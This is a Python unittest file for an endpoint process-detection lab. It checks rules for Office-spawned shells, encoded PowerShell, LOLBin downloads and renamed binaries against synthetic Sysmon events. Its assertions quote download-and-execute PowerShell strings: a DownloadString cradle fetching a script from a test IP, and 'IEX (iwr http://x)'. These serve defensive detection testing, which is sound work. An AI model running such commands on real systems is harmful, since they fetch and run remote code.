"""Tests for the endpoint process detection lab - run with:  python -m unittest -v"""

import base64
import json
import os
import tempfile
import unittest

import detect_process as dp
import generate_sysmon

HERE = os.path.dirname(os.path.abspath(__file__))


class EndpointTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.mkdtemp()
        generate_sysmon.main(["--out", cls.tmp])
        cls.events = dp.load(os.path.join(cls.tmp, "sysmon_process_creation.jsonl"))
        with open(os.path.join(cls.tmp, "allowlist.json"), encoding="utf-8") as fh:
            cls.allow = json.load(fh)
        cls.alerts = dp.detect(cls.events, cls.allow)
        cls.active = [a for a in cls.alerts if not a["suppressed"]]

    def test_committed_data_matches_generator(self):
        name = "sysmon_process_creation.jsonl"
        with open(os.path.join(self.tmp, name), "rb") as a, open(os.path.join(HERE, "data", name), "rb") as b:
            self.assertEqual(a.read(), b.read())

    def test_attack_chain_rules_fire_on_wks0113(self):
        rules = {a["rule"] for a in self.active if a["host"] == "WKS-0113"}
        self.assertEqual(rules, {"OFFICE_SPAWNS_SHELL", "ENCODED_POWERSHELL", "LOLBIN_DOWNLOAD",
                                 "RUN_FROM_USER_PATH", "SCHEDULED_TASK"})

    def test_decoded_download_cradle(self):
        enc = [a for a in self.active if a["rule"] == "ENCODED_POWERSHELL"][0]
        self.assertIn("DownloadString('http://203.0.113.99/a.ps1')", enc["decoded"])

    def test_sccm_suppressed_not_deleted(self):
        sup = [a for a in self.alerts if a["suppressed"]]
        self.assertEqual(len(sup), 5)
        self.assertTrue(all("SCCM" in a["suppressed"] for a in sup))

    def test_allowlist_is_narrow(self):
        ev = dict(self.events[0])
        ev.update({"ParentImage": "C:\\Windows\\CCM\\CcmExec.exe", "User": "NT AUTHORITY\\SYSTEM"})
        evil = {"rule": "ENCODED_POWERSHELL", "decoded": "IEX (iwr http://x)"}
        self.assertIsNone(dp.suppressed(evil, ev, self.allow))

    def test_renamed_powershell_caught_only_by_original_filename(self):
        hits = [a for a in self.active if a["host"] == "WKS-0119"]
        self.assertIn("RENAMED_BINARY", {a["rule"] for a in hits})
        self.assertNotIn("ENCODED_POWERSHELL", {a["rule"] for a in hits})

    def test_decode_short_flag(self):
        cmd = "x.exe -e " + base64.b64encode("Get-Date".encode("utf-16-le")).decode()
        self.assertEqual(dp.decode_ps(cmd), "Get-Date")

    def test_tree_shows_chain(self):
        lines = dp.tree(self.events, "WKS-0113")
        joined = "\n".join(lines)
        self.assertLess(joined.index("winword.exe"), joined.index("certutil.exe"))


if __name__ == "__main__":
    unittest.main()
